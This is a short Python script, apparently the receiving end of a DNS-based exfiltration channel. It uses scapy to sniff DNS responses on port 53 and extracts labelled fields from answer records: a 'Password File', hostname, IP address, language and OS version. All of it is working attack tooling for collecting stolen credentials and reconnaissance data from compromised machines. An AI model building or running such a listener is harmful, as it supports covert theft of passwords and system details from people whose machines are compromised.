from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR

def packet_handler(packet):
    if DNS in packet and packet[DNS].opcode == 0 and packet[DNS].qr == 1:
        dns = packet[DNS]
        for rdata in dns.an:
            if isinstance(rdata.rdata, bytes):
                rdata_str = rdata.rdata.decode()
            else:
                rdata_str = str(rdata.rdata)
                
            if "Password File:" in rdata_str:
                password_file = rdata_str.split("Password File:")[1].strip()
                print("Password File:")
                print(password_file)
            elif "Hostname:" in rdata_str:
                hostname = rdata_str.split("Hostname:")[1].strip()
                print("Hostname:", hostname)
            elif "IP:" in rdata_str:
                ip = rdata_str.split("IP:")[1].strip()
                print("IP Address:", ip)
            elif "Language:" in rdata_str:
                language = rdata_str.split("Language:")[1].strip()
                print("Language:", language)
            elif "OS Version:" in rdata_str:
                os_version = rdata_str.split("OS Version:")[1].strip()
                print("OS Version:", os_version)
        print("---------------------------")

# Start the packet sniffer
def start_sniffer():
    sniff(filter="udp and port 53", prn=packet_handler)

# Start the sniffer
start_sniffer()
